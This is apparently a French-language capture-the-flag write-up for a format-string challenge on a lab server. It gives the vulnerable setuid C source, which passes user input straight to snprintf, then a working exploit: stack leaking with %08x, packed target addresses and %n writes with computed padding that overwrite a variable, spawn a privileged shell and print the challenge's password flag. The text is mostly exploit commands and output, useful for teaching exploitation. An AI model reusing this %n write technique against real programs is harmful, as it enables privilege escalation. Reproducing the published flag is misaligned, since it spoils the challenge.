## formats String (ecriture)
source:
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main( int argc, char ** argv )

{

        int var;
        int check  = 0x04030201;

        char fmt[128];

        if (argc <2)
                exit(0);

        memset( fmt, 0, sizeof(fmt) );

        printf( "check at 0x%x\n", &check );
        printf( "argv[1] = [%s]\n", argv[1] );

        snprintf( fmt, sizeof(fmt), argv[1] );

        if ((check != 0x04030201) && (check != 0xdeadbeef))
                printf ("\nYou are on the right way !\n");

        printf( "fmt=[%s]\n", fmt );
        printf( "check=0x%x\n", check );

        if (check==0xdeadbeef)
        {
                printf("Yeah dude ! You win !\n");
                setreuid(geteuid(), geteuid());
                system("/bin/bash");
        }
}



app-systeme-ch14@challenge02:~$ ./ch14 $(python -c 'print "A" * 1000')
check at 0xbffff708
argv[1] = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
fmt=[AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
check=0x4030201


retrouver ce qu'on écrit:
=========================
app-systeme-ch14@challenge02:~$ ./ch14 $(python -c 'print "AAAA" + "%08x"*9')
check at 0xbffffac8
argv[1] = [AAAA%08x%08x%08x%08x%08x%08x%08x%08x%08x]
fmt=[AAAA080485f10000000000000000000000c2bffffc14b7fe1409f63d4e2e0403020141414141]
check=0x4030201

valeur à réécrir:
=================

>>> struct.pack('I', 0xdeadbeef)
'\xef\xbe\xad\xde'

app-systeme-ch14@challenge02:~$ ./ch14 $(python -c 'print "\xef\xbe\xad\xde" + "%08x"*9')
check at 0xbffffac8
argv[1] = [ﾭ�%08x%08x%08x%08x%08x%08x%08x%08x%08x]
fmt=[ﾭ�080485f10000000000000000000000c2bffffc14b7fe1409f63d4e2e04030201deadbeef]
check=0x4030201

réécrir l'adresse 0xbffffac8:
=============================


on doit écrire

0xbeef à l'adresse 0xbffffad8
0xdead à l'adresse 0xbffffada

>>> struct.pack('I', 0xbffffad8)
'\xd8\xfa\xff\xbf'
>>> struct.pack('I', 0xbffffada)
'\xda\xfa\xff\xbf'

>>> int(0xdead)
57005
>>> int(0xbeef)
48879
>>> 57005-48879
8126

écart trouvé tout a l'heure pour l'écriture: "%8x"*8 (*9 on lit ce qu'on réécris)


app-systeme-ch14@challenge02:~$ ./ch14 $(python -c 'print "JUNK"+"\xd8\xfa\xff\xbf"+"JUNK"+"\xda\xfa\xff\xbf"+"%8x"*8+"%48879c"+"%n"+"%8126c"+"%n"')
check at 0xbffffaa8
argv[1] = [JUNK����JUNK����%8x%8x%8x%8x%8x%8x%8x%8x%48879c%n%8126c%n]
fmt=[JUNK����JUNK���� 80485f1       0       0    ?���]
check=0x4030201


La variable check se décale, on modifie l'adresse d'écriture:

app-systeme-ch14@challenge02:~$ ./ch14 $(python -c 'print "JUNK"+"\xa8\xfa\xff\xbf"+"JUNK"+"\xaa\xfa\xff\xbf"+"%8x"*8+"%48879c"+"%n"+"%8126c"+"%n"')
check at 0xbffffaa8
argv[1] = [JUNK����JUNK����%8x%8x%8x%8x%8x%8x%8x%8x%48879c%n%8126c%n]

You are on the right way !
fmt=[]
check=0xdefdbf3f

on calcul l'écart entre les valeurs:

>>> int(0xdefd)-int(0xdead)
80
>>> 48879-80
48799

app-systeme-ch14@challenge02:~$ ./ch14 $(python -c 'print "JUNK"+"\xa8\xfa\xff\xbf"+"JUNK"+"\xaa\xfa\xff\xbf"+"%8x"*8+"%48799c"+"%n"+"%8126c"+"%n"')
check at 0xbffffaa8
argv[1] = [JUNK����JUNK����%8x%8x%8x%8x%8x%8x%8x%8x%48799c%n%8126c%n]
fmt=[]
check=0xdeadbeef
Yeah dude ! You win !


app-systeme-ch14-cracked@challenge02:~$ id
uid=1214(app-systeme-ch14-cracked) gid=1114(app-systeme-ch14) groupes=1114(app-systeme-ch14),100(users)
app-systeme-ch14-cracked@challenge02:~$ cat .passwd
1l1k3p0Rn&P0pC0rn

